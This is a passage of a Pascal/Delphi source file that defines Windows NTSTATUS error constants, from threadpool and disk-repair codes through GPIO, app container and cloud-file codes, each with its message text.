// The hardware has reported an uncorrectable memory error.
//
STATUS_HARDWARE_MEMORY_ERROR     = NTSTATUS($C0000709);

//
// MessageId: STATUS_THREADPOOL_HANDLE_EXCEPTION
//
// MessageText:
//
// Status 0x%08x was returned, waiting on handle 0x%x for wait 0x%p, in waiter 0x%p.
//
STATUS_THREADPOOL_HANDLE_EXCEPTION = NTSTATUS($C000070A);

//
// MessageId: STATUS_THREADPOOL_SET_EVENT_ON_COMPLETION_FAILED
//
// MessageText:
//
// After a callback to 0x%p(0x%p), a completion call to SetEvent(0x%p) failed with status 0x%08x.
//
STATUS_THREADPOOL_SET_EVENT_ON_COMPLETION_FAILED = NTSTATUS($C000070B);

//
// MessageId: STATUS_THREADPOOL_RELEASE_SEMAPHORE_ON_COMPLETION_FAILED
//
// MessageText:
//
// After a callback to 0x%p(0x%p), a completion call to ReleaseSemaphore(0x%p, %d) failed with status 0x%08x.
//
STATUS_THREADPOOL_RELEASE_SEMAPHORE_ON_COMPLETION_FAILED = NTSTATUS($C000070C);

//
// MessageId: STATUS_THREADPOOL_RELEASE_MUTEX_ON_COMPLETION_FAILED
//
// MessageText:
//
// After a callback to 0x%p(0x%p), a completion call to ReleaseMutex(%p) failed with status 0x%08x.
//
STATUS_THREADPOOL_RELEASE_MUTEX_ON_COMPLETION_FAILED = NTSTATUS($C000070D);

//
// MessageId: STATUS_THREADPOOL_FREE_LIBRARY_ON_COMPLETION_FAILED
//
// MessageText:
//
// After a callback to 0x%p(0x%p), an completion call to FreeLibrary(%p) failed with status 0x%08x.
//
STATUS_THREADPOOL_FREE_LIBRARY_ON_COMPLETION_FAILED = NTSTATUS($C000070E);

//
// MessageId: STATUS_THREADPOOL_RELEASED_DURING_OPERATION
//
// MessageText:
//
// The threadpool 0x%p was released while a thread was posting a callback to 0x%p(0x%p) to it.
//
STATUS_THREADPOOL_RELEASED_DURING_OPERATION = NTSTATUS($C000070F);

//
// MessageId: STATUS_CALLBACK_RETURNED_WHILE_IMPERSONATING
//
// MessageText:
//
// A threadpool worker thread is impersonating a client, after a callback to 0x%p(0x%p).
// This is unexpected, indicating that the callback is missing a call to revert the impersonation.
//
STATUS_CALLBACK_RETURNED_WHILE_IMPERSONATING = NTSTATUS($C0000710);

//
// MessageId: STATUS_APC_RETURNED_WHILE_IMPERSONATING
//
// MessageText:
//
// A threadpool worker thread is impersonating a client, after executing an APC.
// This is unexpected, indicating that the APC is missing a call to revert the impersonation.
//
STATUS_APC_RETURNED_WHILE_IMPERSONATING = NTSTATUS($C0000711);

//
// MessageId: STATUS_PROCESS_IS_PROTECTED
//
// MessageText:
//
// Either the target process, or the target thread's containing process, is a protected process.
//
STATUS_PROCESS_IS_PROTECTED      = NTSTATUS($C0000712);

//
// MessageId: STATUS_MCA_EXCEPTION
//
// MessageText:
//
// A Thread is getting dispatched with MCA EXCEPTION because of MCA.
//
STATUS_MCA_EXCEPTION             = NTSTATUS($C0000713);

//
// MessageId: STATUS_CERTIFICATE_MAPPING_NOT_UNIQUE
//
// MessageText:
//
// The client certificate account mapping is not unique.
//
STATUS_CERTIFICATE_MAPPING_NOT_UNIQUE = NTSTATUS($C0000714);

//
// MessageId: STATUS_SYMLINK_CLASS_DISABLED
//
// MessageText:
//
// The symbolic link cannot be followed because its type is disabled.
//
STATUS_SYMLINK_CLASS_DISABLED    = NTSTATUS($C0000715);

//
// MessageId: STATUS_INVALID_IDN_NORMALIZATION
//
// MessageText:
//
// Indicates that the specified string is not valid for IDN normalization.
//
STATUS_INVALID_IDN_NORMALIZATION = NTSTATUS($C0000716);

//
// MessageId: STATUS_NO_UNICODE_TRANSLATION
//
// MessageText:
//
// No mapping for the Unicode character exists in the target multi-byte code page.
//
STATUS_NO_UNICODE_TRANSLATION    = NTSTATUS($C0000717);

//
// MessageId: STATUS_ALREADY_REGISTERED
//
// MessageText:
//
// The provided callback is already registered.
//
STATUS_ALREADY_REGISTERED        = NTSTATUS($C0000718);    //winnt

//
// MessageId: STATUS_CONTEXT_MISMATCH
//
// MessageText:
//
// The provided context did not match the target.
//
STATUS_CONTEXT_MISMATCH          = NTSTATUS($C0000719);

//
// MessageId: STATUS_PORT_ALREADY_HAS_COMPLETION_LIST
//
// MessageText:
//
// The specified port already has a completion list.
//
STATUS_PORT_ALREADY_HAS_COMPLETION_LIST = NTSTATUS($C000071A);

//
// MessageId: STATUS_CALLBACK_RETURNED_THREAD_PRIORITY
//
// MessageText:
//
// A threadpool worker thread enter a callback at thread base priority 0x%x and exited at priority 0x%x.
// This is unexpected, indicating that the callback missed restoring the priority.
//
STATUS_CALLBACK_RETURNED_THREAD_PRIORITY = NTSTATUS($C000071B);

//
// MessageId: STATUS_INVALID_THREAD
//
// MessageText:
//
// An invalid thread, handle %p, is specified for this operation. Possibly, a threadpool worker thread was specified.
//
STATUS_INVALID_THREAD            = NTSTATUS($C000071C);

//
// MessageId: STATUS_CALLBACK_RETURNED_TRANSACTION
//
// MessageText:
//
// A threadpool worker thread enter a callback, which left transaction state.
// This is unexpected, indicating that the callback missed clearing the transaction.
//
STATUS_CALLBACK_RETURNED_TRANSACTION = NTSTATUS($C000071D);

//
// MessageId: STATUS_CALLBACK_RETURNED_LDR_LOCK
//
// MessageText:
//
// A threadpool worker thread enter a callback, which left the loader lock held.
// This is unexpected, indicating that the callback missed releasing the lock.
//
STATUS_CALLBACK_RETURNED_LDR_LOCK = NTSTATUS($C000071E);

//
// MessageId: STATUS_CALLBACK_RETURNED_LANG
//
// MessageText:
//
// A threadpool worker thread enter a callback, which left with preferred languages set.
// This is unexpected, indicating that the callback missed clearing them.
//
STATUS_CALLBACK_RETURNED_LANG    = NTSTATUS($C000071F);

//
// MessageId: STATUS_CALLBACK_RETURNED_PRI_BACK
//
// MessageText:
//
// A threadpool worker thread enter a callback, which left with background priorities set.
// This is unexpected, indicating that the callback missed restoring the original priorities.
//
STATUS_CALLBACK_RETURNED_PRI_BACK = NTSTATUS($C0000720);

//
// MessageId: STATUS_CALLBACK_RETURNED_THREAD_AFFINITY
//
// MessageText:
//
// A threadpool worker thread enter a callback at thread affinity %p and exited at affinity %p.
// This is unexpected, indicating that the callback missed restoring the priority.
//
STATUS_CALLBACK_RETURNED_THREAD_AFFINITY = NTSTATUS($C0000721);

//
// MessageId: STATUS_LPC_HANDLE_COUNT_EXCEEDED
//
// MessageText:
//
// The caller has exceeded the maximum number of handles that may be transmitted in
// a single local procedure call.
//
STATUS_LPC_HANDLE_COUNT_EXCEEDED = NTSTATUS($C0000722);

//
// MessageId: STATUS_EXECUTABLE_MEMORY_WRITE
//
// MessageText:
//
// A write to executable memory occurred for a process that is managing such operations.
//
STATUS_EXECUTABLE_MEMORY_WRITE   = NTSTATUS($C0000723);

//
// MessageId: STATUS_KERNEL_EXECUTABLE_MEMORY_WRITE
//
// MessageText:
//
// A write to executable memory occurred from kernel mode for a process that is managing such operations.
//
STATUS_KERNEL_EXECUTABLE_MEMORY_WRITE = NTSTATUS($C0000724);

//
// MessageId: STATUS_ATTACHED_EXECUTABLE_MEMORY_WRITE
//
// MessageText:
//
// A write to executable memory occurred from kernel mode while attached to a process that is managing such operations.
//
STATUS_ATTACHED_EXECUTABLE_MEMORY_WRITE = NTSTATUS($C0000725);

//
// MessageId: STATUS_TRIGGERED_EXECUTABLE_MEMORY_WRITE
//
// MessageText:
//
// A write to executable memory was triggered cross-process to a process that is managing such operations.
//
STATUS_TRIGGERED_EXECUTABLE_MEMORY_WRITE = NTSTATUS($C0000726);

//
// MessageId: STATUS_DISK_REPAIR_DISABLED
//
// MessageText:
//
// The attempted operation required self healing to be enabled.
//
STATUS_DISK_REPAIR_DISABLED      = NTSTATUS($C0000800);

//
// MessageId: STATUS_DS_DOMAIN_RENAME_IN_PROGRESS
//
// MessageText:
//
// The Directory Service cannot perform the requested operation because a domain rename operation is in progress.
//
STATUS_DS_DOMAIN_RENAME_IN_PROGRESS = NTSTATUS($C0000801);

//
// MessageId: STATUS_DISK_QUOTA_EXCEEDED
//
// MessageText:
//
// The requested file operation failed because the storage quota was exceeded.
// To free up disk space, move files to a different location or delete unnecessary files. For more information, contact your system administrator.
//
STATUS_DISK_QUOTA_EXCEEDED       = NTSTATUS($C0000802);

//
// MessageId: STATUS_DATA_LOST_REPAIR
//
// MessageText:
//
// Windows discovered a corruption in the file "%hs".
// This file has now been repaired.
// Please check if any data in the file was lost because of the corruption.
//
STATUS_DATA_LOST_REPAIR          = NTSTATUS($80000803);

//
// MessageId: STATUS_CONTENT_BLOCKED
//
// MessageText:
//
// The requested file operation failed because the storage policy blocks that type of file. For more information, contact your system administrator.
//
STATUS_CONTENT_BLOCKED           = NTSTATUS($C0000804);

//
// MessageId: STATUS_BAD_CLUSTERS
//
// MessageText:
//
// The operation could not be completed due to bad clusters on disk.
//
STATUS_BAD_CLUSTERS              = NTSTATUS($C0000805);

//
// MessageId: STATUS_VOLUME_DIRTY
//
// MessageText:
//
// The operation could not be completed because the volume is dirty. Please run chkdsk and try again.
//
STATUS_VOLUME_DIRTY              = NTSTATUS($C0000806);

//
// MessageId: STATUS_DISK_REPAIR_REDIRECTED
//
// MessageText:
//
// The volume repair could not be performed while it is online.
// Please schedule to take the volume offline so that it can be repaired.
//
STATUS_DISK_REPAIR_REDIRECTED    = NTSTATUS($40000807);

//
// MessageId: STATUS_DISK_REPAIR_UNSUCCESSFUL
//
// MessageText:
//
// The volume repair was not successful.
//
STATUS_DISK_REPAIR_UNSUCCESSFUL  = NTSTATUS($C0000808);

//
// MessageId: STATUS_CORRUPT_LOG_OVERFULL
//
// MessageText:
//
// One of the volume corruption logs is full. Further corruptions that may be detected won't be logged.
//
STATUS_CORRUPT_LOG_OVERFULL      = NTSTATUS($C0000809);

//
// MessageId: STATUS_CORRUPT_LOG_CORRUPTED
//
// MessageText:
//
// One of the volume corruption logs is internally corrupted and needs to be recreated. The volume may contain undetected corruptions and must be scanned.
//
STATUS_CORRUPT_LOG_CORRUPTED     = NTSTATUS($C000080A);

//
// MessageId: STATUS_CORRUPT_LOG_UNAVAILABLE
//
// MessageText:
//
// One of the volume corruption logs is unavailable for being operated on.
//
STATUS_CORRUPT_LOG_UNAVAILABLE   = NTSTATUS($C000080B);

//
// MessageId: STATUS_CORRUPT_LOG_DELETED_FULL
//
// MessageText:
//
// One of the volume corruption logs was deleted while still having corruption records in them. The volume contains detected corruptions and must be scanned.
//
STATUS_CORRUPT_LOG_DELETED_FULL  = NTSTATUS($C000080C);

//
// MessageId: STATUS_CORRUPT_LOG_CLEARED
//
// MessageText:
//
// One of the volume corruption logs was cleared by chkdsk and no longer contains real corruptions.
//
STATUS_CORRUPT_LOG_CLEARED       = NTSTATUS($C000080D);

//
// MessageId: STATUS_ORPHAN_NAME_EXHAUSTED
//
// MessageText:
//
// Orphaned files exist on the volume but could not be recovered because no more new names could be created in the recovery directory. Files must be moved from the recovery directory.
//
STATUS_ORPHAN_NAME_EXHAUSTED     = NTSTATUS($C000080E);

//
// MessageId: STATUS_PROACTIVE_SCAN_IN_PROGRESS
//
// MessageText:
//
// The operation could not be completed because an instance of Proactive Scanner is currently running.
//
STATUS_PROACTIVE_SCAN_IN_PROGRESS = NTSTATUS($C000080F);

//
// MessageId: STATUS_ENCRYPTED_IO_NOT_POSSIBLE
//
// MessageText:
//
// The read or write operation to an encrypted file could not be completed because the file has not been opened for data access.
//
STATUS_ENCRYPTED_IO_NOT_POSSIBLE = NTSTATUS($C0000810);

//
// MessageId: STATUS_CORRUPT_LOG_UPLEVEL_RECORDS
//
// MessageText:
//
// One of the volume corruption logs comes from a newer version of Windows and contains corruption records. The log will be emptied and reset to the current version, and the volume health state will be updated accordingly.
//
STATUS_CORRUPT_LOG_UPLEVEL_RECORDS = NTSTATUS($C0000811);

//
// MessageId: STATUS_FILE_CHECKED_OUT
//
// MessageText:
//
// This file is checked out or locked for editing by another user.
//
STATUS_FILE_CHECKED_OUT          = NTSTATUS($C0000901);

//
// MessageId: STATUS_CHECKOUT_REQUIRED
//
// MessageText:
//
// The file must be checked out before saving changes.
//
STATUS_CHECKOUT_REQUIRED         = NTSTATUS($C0000902);

//
// MessageId: STATUS_BAD_FILE_TYPE
//
// MessageText:
//
// The file type being saved or retrieved has been blocked.
//
STATUS_BAD_FILE_TYPE             = NTSTATUS($C0000903);

//
// MessageId: STATUS_FILE_TOO_LARGE
//
// MessageText:
//
// The file size exceeds the limit allowed and cannot be saved.
//
STATUS_FILE_TOO_LARGE            = NTSTATUS($C0000904);

//
// MessageId: STATUS_FORMS_AUTH_REQUIRED
//
// MessageText:
//
// Access Denied. Before opening files in this location, you must first browse to the web site and select the option to login automatically.
//
STATUS_FORMS_AUTH_REQUIRED       = NTSTATUS($C0000905);

//
// MessageId: STATUS_VIRUS_INFECTED
//
// MessageText:
//
// Operation did not complete successfully because the file contains a virus or potentially unwanted software.
//
STATUS_VIRUS_INFECTED            = NTSTATUS($C0000906);

//
// MessageId: STATUS_VIRUS_DELETED
//
// MessageText:
//
// This file contains a virus or potentially unwanted software and cannot be opened. Due to the nature of this virus or potentially unwanted software, the file has been removed from this location.
//
STATUS_VIRUS_DELETED             = NTSTATUS($C0000907);

//
// MessageId: STATUS_BAD_MCFG_TABLE
//
// MessageText:
//
// The resources required for this device conflict with the MCFG table.
//
STATUS_BAD_MCFG_TABLE            = NTSTATUS($C0000908);

//
// MessageId: STATUS_CANNOT_BREAK_OPLOCK
//
// MessageText:
//
// The operation did not complete successfully because it would cause an oplock to be broken. The caller has requested that existing oplocks not be broken.
//
STATUS_CANNOT_BREAK_OPLOCK       = NTSTATUS($C0000909);

//
// MessageId: STATUS_BAD_KEY
//
// MessageText:
//
// Bad key.
//
STATUS_BAD_KEY                   = NTSTATUS($C000090A);

//
// MessageId: STATUS_BAD_DATA
//
// MessageText:
//
// Bad data.
//
STATUS_BAD_DATA                  = NTSTATUS($C000090B);

//
// MessageId: STATUS_NO_KEY
//
// MessageText:
//
// Key does not exist.
//
STATUS_NO_KEY                    = NTSTATUS($C000090C);

//
// MessageId: STATUS_FILE_HANDLE_REVOKED
//
// MessageText:
//
// Access to the specified file handle has been revoked.
//
STATUS_FILE_HANDLE_REVOKED       = NTSTATUS($C0000910);

//
// MessageId: STATUS_WOW_ASSERTION
//
// MessageText:
//
// WOW Assertion Error.
//
STATUS_WOW_ASSERTION             = NTSTATUS($C0009898);

//
// MessageId: STATUS_INVALID_SIGNATURE
//
// MessageText:
//
// The cryptographic signature is invalid.
//
STATUS_INVALID_SIGNATURE         = NTSTATUS($C000A000);

//
// MessageId: STATUS_HMAC_NOT_SUPPORTED
//
// MessageText:
//
// The cryptographic provider does not support HMAC.
//
STATUS_HMAC_NOT_SUPPORTED        = NTSTATUS($C000A001);

//
// MessageId: STATUS_AUTH_TAG_MISMATCH
//
// MessageText:
//
// The computed authentication tag did not match the input authentication tag.
//
STATUS_AUTH_TAG_MISMATCH         = NTSTATUS($C000A002);

//
// MessageId: STATUS_INVALID_STATE_TRANSITION
//
// MessageText:
//
// The requested state transition is invalid and cannot be performed.
//
STATUS_INVALID_STATE_TRANSITION  = NTSTATUS($C000A003);

//
// MessageId: STATUS_INVALID_KERNEL_INFO_VERSION
//
// MessageText:
//
// The supplied kernel information version is invalid.
//
STATUS_INVALID_KERNEL_INFO_VERSION = NTSTATUS($C000A004);

//
// MessageId: STATUS_INVALID_PEP_INFO_VERSION
//
// MessageText:
//
// The supplied PEP information version is invalid.
//
STATUS_INVALID_PEP_INFO_VERSION  = NTSTATUS($C000A005);

//
// MessageId: STATUS_HANDLE_REVOKED
//
// MessageText:
//
// Access to the specified handle has been revoked.
//
STATUS_HANDLE_REVOKED            = NTSTATUS($C000A006);

//
// MessageId: STATUS_EOF_ON_GHOSTED_RANGE
//
// MessageText:
//
// The file operation will result in the end of file being on a ghosted range.
//
STATUS_EOF_ON_GHOSTED_RANGE      = NTSTATUS($C000A007);

//
// MessageId: STATUS_CC_NEEDS_CALLBACK_SECTION_DRAIN
//
// MessageText:
//
// Filesystem needs to release all the file resources and callback into Cc to drain pending section deletions, before retrying the operation.
//
STATUS_CC_NEEDS_CALLBACK_SECTION_DRAIN = NTSTATUS($C000A008);

{*++

 MessageId's 0xa010 - 0xa07f (inclusive) are reserved for TCPIP errors.

--*}
//
// MessageId: STATUS_IPSEC_QUEUE_OVERFLOW
//
// MessageText:
//
// The IPSEC queue overflowed.
//
STATUS_IPSEC_QUEUE_OVERFLOW      = NTSTATUS($C000A010);

//
// MessageId: STATUS_ND_QUEUE_OVERFLOW
//
// MessageText:
//
// The neighbor discovery queue overflowed.
//
STATUS_ND_QUEUE_OVERFLOW         = NTSTATUS($C000A011);

//
// MessageId: STATUS_HOPLIMIT_EXCEEDED
//
// MessageText:
//
// An ICMP hop limit exceeded error was received.
//
STATUS_HOPLIMIT_EXCEEDED         = NTSTATUS($C000A012);

//
// MessageId: STATUS_PROTOCOL_NOT_SUPPORTED
//
// MessageText:
//
// The protocol is not installed on the local machine.
//
STATUS_PROTOCOL_NOT_SUPPORTED    = NTSTATUS($C000A013);

//
// MessageId: STATUS_FASTPATH_REJECTED
//
// MessageText:
//
// An operation or data has been rejected while on the network fast path.
//
STATUS_FASTPATH_REJECTED         = NTSTATUS($C000A014);

{*++

 MessageId's 0xa014 - 0xa07f (inclusive) are reserved for TCPIP errors.

--*}
//
// MessageId: STATUS_LOST_WRITEBEHIND_DATA_NETWORK_DISCONNECTED
//
// MessageText:
//
// {Delayed Write Failed}
// Windows was unable to save all the data for the file %hs); the data has been lost.
// This error may be caused by network connectivity issues. Please try to save this file elsewhere.
//
STATUS_LOST_WRITEBEHIND_DATA_NETWORK_DISCONNECTED = NTSTATUS($C000A080);

//
// MessageId: STATUS_LOST_WRITEBEHIND_DATA_NETWORK_SERVER_ERROR
//
// MessageText:
//
// {Delayed Write Failed}
// Windows was unable to save all the data for the file %hs); the data has been lost.
// This error was returned by the server on which the file exists. Please try to save this file elsewhere.
//
STATUS_LOST_WRITEBEHIND_DATA_NETWORK_SERVER_ERROR = NTSTATUS($C000A081);

//
// MessageId: STATUS_LOST_WRITEBEHIND_DATA_LOCAL_DISK_ERROR
//
// MessageText:
//
// {Delayed Write Failed}
// Windows was unable to save all the data for the file %hs); the data has been lost.
// This error may be caused if the device has been removed or the media is write-protected.
//
STATUS_LOST_WRITEBEHIND_DATA_LOCAL_DISK_ERROR = NTSTATUS($C000A082);

//
// MessageId: STATUS_XML_PARSE_ERROR
//
// MessageText:
//
// Windows was unable to parse the requested XML data.
//
STATUS_XML_PARSE_ERROR           = NTSTATUS($C000A083);

//
// MessageId: STATUS_XMLDSIG_ERROR
//
// MessageText:
//
// An error was encountered while processing an XML digital signature.
//
STATUS_XMLDSIG_ERROR             = NTSTATUS($C000A084);

//
// MessageId: STATUS_WRONG_COMPARTMENT
//
// MessageText:
//
// Indicates that the caller made the connection request in the wrong routing compartment.
//
STATUS_WRONG_COMPARTMENT         = NTSTATUS($C000A085);

//
// MessageId: STATUS_AUTHIP_FAILURE
//
// MessageText:
//
// Indicates that there was an AuthIP failure when attempting to connect to the remote host.
//
STATUS_AUTHIP_FAILURE            = NTSTATUS($C000A086);

//
// MessageId: STATUS_DS_OID_MAPPED_GROUP_CANT_HAVE_MEMBERS
//
// MessageText:
//
// OID mapped groups cannot have members.
//
STATUS_DS_OID_MAPPED_GROUP_CANT_HAVE_MEMBERS = NTSTATUS($C000A087);

//
// MessageId: STATUS_DS_OID_NOT_FOUND
//
// MessageText:
//
// The specified OID cannot be found.
//
STATUS_DS_OID_NOT_FOUND          = NTSTATUS($C000A088);

//
// MessageId: STATUS_INCORRECT_ACCOUNT_TYPE
//
// MessageText:
//
// The system is not authoritative for the specified account and therefore cannot complete the operation. Please retry the operation using the provider associated with this account. If this is an online provider please use the provider's online site.
//
STATUS_INCORRECT_ACCOUNT_TYPE    = NTSTATUS($C000A089);

{*++

 MessageId's 0xa100 - 0xa120 (inclusive) are for the SMB Hash Generation Service.

--*}
//
// MessageId: STATUS_HASH_NOT_SUPPORTED
//
// MessageText:
//
// Hash generation for the specified version and hash type is not enabled on server.
//
STATUS_HASH_NOT_SUPPORTED        = NTSTATUS($C000A100);

//
// MessageId: STATUS_HASH_NOT_PRESENT
//
// MessageText:
//
// The hash requests is not present or not up to date with the current file contents.
//
STATUS_HASH_NOT_PRESENT          = NTSTATUS($C000A101);

{*++

 MessageId's 0xa121 - 0xa140 (inclusive) are for GPIO (General Purpose I/O) controller related errors.

--*}
//
// MessageId: STATUS_SECONDARY_IC_PROVIDER_NOT_REGISTERED
//
// MessageText:
//
// The secondary interrupt controller instance that manages the specified interrupt is not registered.
//
STATUS_SECONDARY_IC_PROVIDER_NOT_REGISTERED = NTSTATUS($C000A121);

//
// MessageId: STATUS_GPIO_CLIENT_INFORMATION_INVALID
//
// MessageText:
//
// The information supplied by the GPIO client driver is invalid.
//
STATUS_GPIO_CLIENT_INFORMATION_INVALID = NTSTATUS($C000A122);

//
// MessageId: STATUS_GPIO_VERSION_NOT_SUPPORTED
//
// MessageText:
//
// The version specified by the GPIO client driver is not supported.
//
STATUS_GPIO_VERSION_NOT_SUPPORTED = NTSTATUS($C000A123);

//
// MessageId: STATUS_GPIO_INVALID_REGISTRATION_PACKET
//
// MessageText:
//
// The registration packet supplied by the GPIO client driver is not valid.
//
STATUS_GPIO_INVALID_REGISTRATION_PACKET = NTSTATUS($C000A124);

//
// MessageId: STATUS_GPIO_OPERATION_DENIED
//
// MessageText:
//
// The requested operation is not supported for the specified handle.
//
STATUS_GPIO_OPERATION_DENIED     = NTSTATUS($C000A125);

//
// MessageId: STATUS_GPIO_INCOMPATIBLE_CONNECT_MODE
//
// MessageText:
//
// The requested connect mode conflicts with an existing mode on one or more of the specified pins.
//
STATUS_GPIO_INCOMPATIBLE_CONNECT_MODE = NTSTATUS($C000A126);

//
// MessageId: STATUS_GPIO_INTERRUPT_ALREADY_UNMASKED
//
// MessageText:
//
// The interrupt requested to be unmasked is not masked.
//
STATUS_GPIO_INTERRUPT_ALREADY_UNMASKED = NTSTATUS($8000A127);

{*++

 MessageId's 0xa141 - 0xa160 (inclusive) are for run levels support.

--*}
//
// MessageId: STATUS_CANNOT_SWITCH_RUNLEVEL
//
// MessageText:
//
// The requested run level switch cannot be completed successfully since
// one or more services refused to stop or restart.
//
STATUS_CANNOT_SWITCH_RUNLEVEL    = NTSTATUS($C000A141);

//
// MessageId: STATUS_INVALID_RUNLEVEL_SETTING
//
// MessageText:
//
// The service has an invalid run level setting. The run level for a service
// must not be higher than the run level of its dependent services.
//
STATUS_INVALID_RUNLEVEL_SETTING  = NTSTATUS($C000A142);

//
// MessageId: STATUS_RUNLEVEL_SWITCH_TIMEOUT
//
// MessageText:
//
// The requested run level switch cannot be completed successfully since
// one or more services will not stop or restart within the specified timeout.
//
STATUS_RUNLEVEL_SWITCH_TIMEOUT   = NTSTATUS($C000A143);

//
// MessageId: STATUS_SERVICES_FAILED_AUTOSTART
//
// MessageText:
//
// One or more services failed to start during the service startup phase of a run level switch.
//
STATUS_SERVICES_FAILED_AUTOSTART = NTSTATUS($4000A144);

//
// MessageId: STATUS_RUNLEVEL_SWITCH_AGENT_TIMEOUT
//
// MessageText:
//
// A run level switch agent did not respond within the specified timeout.
//
STATUS_RUNLEVEL_SWITCH_AGENT_TIMEOUT = NTSTATUS($C000A145);

//
// MessageId: STATUS_RUNLEVEL_SWITCH_IN_PROGRESS
//
// MessageText:
//
// A run level switch is currently in progress.
//
STATUS_RUNLEVEL_SWITCH_IN_PROGRESS = NTSTATUS($C000A146);

{*++

 MessageId's 0xa200 - 0xa280 (inclusive) are reserved for app container specific messages.

--*}
//
// MessageId: STATUS_NOT_APPCONTAINER
//
// MessageText:
//
// This operation is only valid in the context of an app container.
//
STATUS_NOT_APPCONTAINER          = NTSTATUS($C000A200);

//
// MessageId: STATUS_NOT_SUPPORTED_IN_APPCONTAINER
//
// MessageText:
//
// This functionality is not supported in the context of an app container.
//
STATUS_NOT_SUPPORTED_IN_APPCONTAINER = NTSTATUS($C000A201);

//
// MessageId: STATUS_INVALID_PACKAGE_SID_LENGTH
//
// MessageText:
//
// The length of the SID supplied is not a valid length for app container SIDs.
//
STATUS_INVALID_PACKAGE_SID_LENGTH = NTSTATUS($C000A202);

//
// MessageId: STATUS_LPAC_ACCESS_DENIED
//
// MessageText:
//
// Access to the specified resource has been denied for a less privileged app container.
//
STATUS_LPAC_ACCESS_DENIED        = NTSTATUS($C000A203);

//
// MessageId: STATUS_ADMINLESS_ACCESS_DENIED
//
// MessageText:
//
// Access to the specified resource has been denied for an adminless system.
//
STATUS_ADMINLESS_ACCESS_DENIED   = NTSTATUS($C000A204);

{*++

 MessageId's 0xa281 - 0xa2a0 (inclusive) are reserved for Fast Cache specific messages.

--*}
//
// MessageId: STATUS_APP_DATA_NOT_FOUND
//
// MessageText:
//
// Fast Cache data not found.
//
STATUS_APP_DATA_NOT_FOUND        = NTSTATUS($C000A281);

//
// MessageId: STATUS_APP_DATA_EXPIRED
//
// MessageText:
//
// Fast Cache data expired.
//
STATUS_APP_DATA_EXPIRED          = NTSTATUS($C000A282);

//
// MessageId: STATUS_APP_DATA_CORRUPT
//
// MessageText:
//
// Fast Cache data corrupt.
//
STATUS_APP_DATA_CORRUPT          = NTSTATUS($C000A283);

//
// MessageId: STATUS_APP_DATA_LIMIT_EXCEEDED
//
// MessageText:
//
// Fast Cache data has exceeded its max size and cannot be updated.
//
STATUS_APP_DATA_LIMIT_EXCEEDED   = NTSTATUS($C000A284);

//
// MessageId: STATUS_APP_DATA_REBOOT_REQUIRED
//
// MessageText:
//
// Fast Cache has been ReArmed and requires a reboot until it can be updated.
//
STATUS_APP_DATA_REBOOT_REQUIRED  = NTSTATUS($C000A285);

{*++

 MessageId's 0xa2a1 - 0xa2dc (inclusive) are for File System specific messages.

--*}
//
// MessageId: STATUS_OFFLOAD_READ_FLT_NOT_SUPPORTED
//
// MessageText:
//
// The copy offload read operation is not supported by a filter.
//
STATUS_OFFLOAD_READ_FLT_NOT_SUPPORTED = NTSTATUS($C000A2A1);

//
// MessageId: STATUS_OFFLOAD_WRITE_FLT_NOT_SUPPORTED
//
// MessageText:
//
// The copy offload write operation is not supported by a filter.
//
STATUS_OFFLOAD_WRITE_FLT_NOT_SUPPORTED = NTSTATUS($C000A2A2);

//
// MessageId: STATUS_OFFLOAD_READ_FILE_NOT_SUPPORTED
//
// MessageText:
//
// The copy offload read operation is not supported for the file.
//
STATUS_OFFLOAD_READ_FILE_NOT_SUPPORTED = NTSTATUS($C000A2A3);

//
// MessageId: STATUS_OFFLOAD_WRITE_FILE_NOT_SUPPORTED
//
// MessageText:
//
// The copy offload write operation is not supported for the file.
//
STATUS_OFFLOAD_WRITE_FILE_NOT_SUPPORTED = NTSTATUS($C000A2A4);

//
// MessageId: STATUS_WOF_WIM_HEADER_CORRUPT
//
// MessageText:
//
// The WOF driver encountered a corruption in WIM image's Header.
//
STATUS_WOF_WIM_HEADER_CORRUPT    = NTSTATUS($C000A2A5);

//
// MessageId: STATUS_WOF_WIM_RESOURCE_TABLE_CORRUPT
//
// MessageText:
//
// The WOF driver encountered a corruption in WIM image's Resource Table.
//
STATUS_WOF_WIM_RESOURCE_TABLE_CORRUPT = NTSTATUS($C000A2A6);

//
// MessageId: STATUS_WOF_FILE_RESOURCE_TABLE_CORRUPT
//
// MessageText:
//
// The WOF driver encountered a corruption in the compressed file's Resource Table.
//
STATUS_WOF_FILE_RESOURCE_TABLE_CORRUPT = NTSTATUS($C000A2A7);

{*++

 MessageId's 0xc000 - 0xc0ff (inclusive) are for CimFS specific messages.

--*}
//
// MessageId: STATUS_CIMFS_IMAGE_CORRUPT
//
// MessageText:
//
// The CimFS image is corrupted.
//
STATUS_CIMFS_IMAGE_CORRUPT       = NTSTATUS($C000C001);

{*++

 End of CimFS specific messages.

--*}
{*++

 MessageId's 0xce00 - 0xceff (inclusive) are for File System virtualization specific messages.

--*}
//
// MessageId: STATUS_FILE_SYSTEM_VIRTUALIZATION_UNAVAILABLE
//
// MessageText:
//
// The provider that supports file system virtualization is temporarily unavailable.
//
STATUS_FILE_SYSTEM_VIRTUALIZATION_UNAVAILABLE = NTSTATUS($C000CE01);

//
// MessageId: STATUS_FILE_SYSTEM_VIRTUALIZATION_METADATA_CORRUPT
//
// MessageText:
//
// The metadata for file system virtualization is corrupt and unreadable.
//
STATUS_FILE_SYSTEM_VIRTUALIZATION_METADATA_CORRUPT = NTSTATUS($C000CE02);

//
// MessageId: STATUS_FILE_SYSTEM_VIRTUALIZATION_BUSY
//
// MessageText:
//
// The provider that supports file system virtualization is too busy to complete this operation.
//
STATUS_FILE_SYSTEM_VIRTUALIZATION_BUSY = NTSTATUS($C000CE03);

//
// MessageId: STATUS_FILE_SYSTEM_VIRTUALIZATION_PROVIDER_UNKNOWN
//
// MessageText:
//
// The provider that supports file system virtualization is unknown.
//
STATUS_FILE_SYSTEM_VIRTUALIZATION_PROVIDER_UNKNOWN = NTSTATUS($C000CE04);

//
// MessageId: STATUS_FILE_SYSTEM_VIRTUALIZATION_INVALID_OPERATION
//
// MessageText:
//
// The virtualization operation is not allowed on the file in its current state.
//
STATUS_FILE_SYSTEM_VIRTUALIZATION_INVALID_OPERATION = NTSTATUS($C000CE05);

{*++

 MessageId's 0xcf00 - 0xcfff (inclusive) are for Cloud Files specific messages.

--*}
//
// MessageId: STATUS_CLOUD_FILE_SYNC_ROOT_METADATA_CORRUPT
//
// MessageText:
//
// The cloud sync root metadata is corrupted.
//
STATUS_CLOUD_FILE_SYNC_ROOT_METADATA_CORRUPT = NTSTATUS($C000CF00);

//
// MessageId: STATUS_CLOUD_FILE_PROVIDER_NOT_RUNNING
//
